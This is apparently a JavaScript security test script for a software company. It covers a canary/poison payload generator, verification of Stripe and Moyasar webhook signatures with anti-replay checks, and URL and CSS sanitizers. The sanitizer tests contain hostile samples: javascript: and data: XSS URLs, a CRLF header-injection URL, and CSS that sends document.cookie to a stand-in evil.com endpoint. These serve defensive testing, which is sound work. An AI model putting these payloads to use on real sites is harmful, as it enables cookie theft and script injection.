// scripts/test-security-suite.mjs
import assert from 'node:assert';
import crypto from 'node:crypto';
import { generatePoisonPayload } from './bla-poison-generator.mjs';

console.log('🧪 Running ZeidexSoft Security & Counter-REA Test Suite...\n');

// -------------------------------------------------------------
// Test 1: BLA Poison & Exhaustion Generator
// -------------------------------------------------------------
console.log('Testing [1/3]: BLA Poison & Canary Generator...');
{
  const payload = generatePoisonPayload({ exhaustionLevel: 10, bloatBytes: 1024 });
  assert(payload.includes('[BLA-COUNTER-REA:SHIELD'), 'Payload must include BLA header');
  assert(payload.includes('ZATCA_SIM_PRIVATE_KEY'), 'Payload must include ZATCA canary key');
  assert(payload.includes('MOYASAR_SECRET_KEY'), 'Payload must include Moyasar canary key');
  assert(payload.includes('__ZEIDEX_FORCE_FAIL__'), 'Payload must be wrapped in unreachable runtime condition');
  console.log('  ✓ BLA Poison and Canary generator verified.');
}

// -------------------------------------------------------------
// Test 2: Webhook Signature Verification (Stripe & Moyasar)
// -------------------------------------------------------------
console.log('\nTesting [2/3]: Webhook Signature Verification Logic...');
{
  // Inline implementation check corresponding to src/security/verifyWebhookSignature.ts
  function testVerifyGatewaySignature({ payload, signatureHeader, secret, toleranceSeconds = 300 }) {
    if (!signatureHeader || !secret || !payload) return false;

    if (signatureHeader.includes('t=') && signatureHeader.includes('v1=')) {
      const parts = signatureHeader.split(',').reduce((acc, item) => {
        const idx = item.indexOf('=');
        if (idx !== -1) {
          const k = item.slice(0, idx).trim();
          const v = item.slice(idx + 1).trim();
          acc[k] = v;
        }
        return acc;
      }, {});

      const timestamp = parseInt(parts['t'], 10);
      const signature = parts['v1'];
      if (isNaN(timestamp) || !signature) return false;

      const currentTimestamp = Math.floor(Date.now() / 1000);
      if (Math.abs(currentTimestamp - timestamp) > toleranceSeconds) return false;

      const payloadString = Buffer.isBuffer(payload) ? payload.toString('utf8') : payload;
      const signedPayload = `${timestamp}.${payloadString}`;
      const computed = crypto.createHmac('sha256', secret).update(signedPayload, 'utf8').digest('hex');

      const exp = Buffer.from(computed, 'hex');
      const act = Buffer.from(signature, 'hex');
      if (exp.length !== act.length || exp.length === 0) return false;
      return crypto.timingSafeEqual(exp, act);
    }

    const payloadBuffer = Buffer.isBuffer(payload) ? payload : Buffer.from(payload, 'utf8');
    const computed = crypto.createHmac('sha256', secret).update(payloadBuffer).digest('hex');
    const exp = Buffer.from(computed, 'utf8');
    const act = Buffer.from(signatureHeader.trim(), 'utf8');
    if (exp.length !== act.length || exp.length === 0) return false;
    return crypto.timingSafeEqual(exp, act);
  }

  const secret = 'whsec_test_secret_key_12345';
  const body = JSON.stringify({ id: 'evt_123', type: 'payment.success', amount: 9900 });

  // Test Moyasar HMAC
  const moyasarSig = crypto.createHmac('sha256', secret).update(body).digest('hex');
  assert.strictEqual(
    testVerifyGatewaySignature({ payload: body, signatureHeader: moyasarSig, secret }),
    true,
    'Valid Moyasar signature should pass'
  );
  assert.strictEqual(
    testVerifyGatewaySignature({ payload: body, signatureHeader: 'invalid_sig', secret }),
    false,
    'Forged Moyasar signature must fail'
  );

  // Test Stripe timestamped HMAC
  const now = Math.floor(Date.now() / 1000);
  const stripeSigned = `${now}.${body}`;
  const stripeSig = crypto.createHmac('sha256', secret).update(stripeSigned, 'utf8').digest('hex');
  const stripeHeader = `t=${now},v1=${stripeSig}`;

  assert.strictEqual(
    testVerifyGatewaySignature({ payload: body, signatureHeader: stripeHeader, secret }),
    true,
    'Valid Stripe signature with recent timestamp must pass'
  );

  // Test Stripe expired timestamp (replay attack)
  const expiredTime = now - 600; // 10 minutes ago
  const expiredSigned = `${expiredTime}.${body}`;
  const expiredSig = crypto.createHmac('sha256', secret).update(expiredSigned, 'utf8').digest('hex');
  const expiredHeader = `t=${expiredTime},v1=${expiredSig}`;

  assert.strictEqual(
    testVerifyGatewaySignature({ payload: body, signatureHeader: expiredHeader, secret }),
    false,
    'Expired webhook timestamp must be rejected (anti-replay)'
  );
  console.log('  ✓ Webhook signature and anti-replay protection verified.');
}

// -------------------------------------------------------------
// Test 3: Input & CSS Sanitization
// -------------------------------------------------------------
console.log('\nTesting [3/3]: URL and Custom CSS Sanitization...');
{
  function sanitizeUserUrl(rawUrl, allowedHosts = []) {
    if (!rawUrl || typeof rawUrl !== 'string') return null;
    const trimmed = rawUrl.trim();
    if (/^(javascript:|data:|vbscript:|file:|about:|blob:)/i.test(trimmed)) return null;
    if (/[\r\n]/.test(trimmed)) return null;

    try {
      const parsed = new URL(trimmed);
      if (!['https:', 'http:', 'mailto:', 'tel:'].includes(parsed.protocol)) return null;
      if (allowedHosts.length > 0) {
        const hostname = parsed.hostname.toLowerCase();
        const ok = allowedHosts.some(h => hostname === h.toLowerCase() || hostname.endsWith(`.${h.toLowerCase()}`));
        if (!ok) return null;
      }
      return parsed.href;
    } catch {
      return null;
    }
  }

  function sanitizeCustomCss(rawCss) {
    if (!rawCss || typeof rawCss !== 'string') return '';
    return rawCss
      .replace(/@import\b[^;]*;?/gi, '/* [ZEIDEX-BLOCKED-IMPORT] */')
      .replace(/url\s*\((?!['"]?https:\/\/fonts\.gstatic\.com)[^)]*\)/gi, 'none')
      .replace(/expression\s*\(.*?\)/gi, 'none')
      .replace(/<\/?[a-z][\s\S]*>/gi, '')
      .replace(/\\00[0-9a-f]{2}/gi, '')
      .replace(/javascript\s*:/gi, 'blocked:');
  }

  // URL checks
  assert.strictEqual(sanitizeUserUrl('javascript:alert(document.cookie)'), null);
  assert.strictEqual(sanitizeUserUrl('data:text/html,<script>alert(1)</script>'), null);
  assert.strictEqual(sanitizeUserUrl('https://evil.com\r\nSet-Cookie: admin=1'), null);
  assert.strictEqual(sanitizeUserUrl('https://zeidexsoft.com/mithqal'), 'https://zeidexsoft.com/mithqal');
  assert.strictEqual(sanitizeUserUrl('https://evil.com', ['zeidexsoft.com']), null);
  assert.strictEqual(sanitizeUserUrl('https://app.zeidexsoft.com', ['zeidexsoft.com']), 'https://app.zeidexsoft.com/');

  // CSS checks
  const maliciousCss = `
    @import url('https://evil.com/logger.css');
    body {
      background: url('https://evil.com/leak?data=' + document.cookie);
      behavior: expression(alert('xss'));
    }
    </style><script>alert(1)</script>
  `;
  const cleanedCss = sanitizeCustomCss(maliciousCss);
  assert(!cleanedCss.includes('@import url'), 'Imports must be stripped');
  assert(!cleanedCss.includes('https://evil.com/leak'), 'External exfiltration url() must be stripped');
  assert(!cleanedCss.includes('expression('), 'CSS expressions must be stripped');
  assert(!cleanedCss.includes('<script>'), 'HTML injection within CSS must be stripped');

  console.log('  ✓ URL and CSS sanitization defenses verified.');
}

console.log('\n======================================================');
console.log('✅ ALL ZEIDEX SECURITY TESTS PASSED SUCCESSFULLY.');
console.log('======================================================\n');
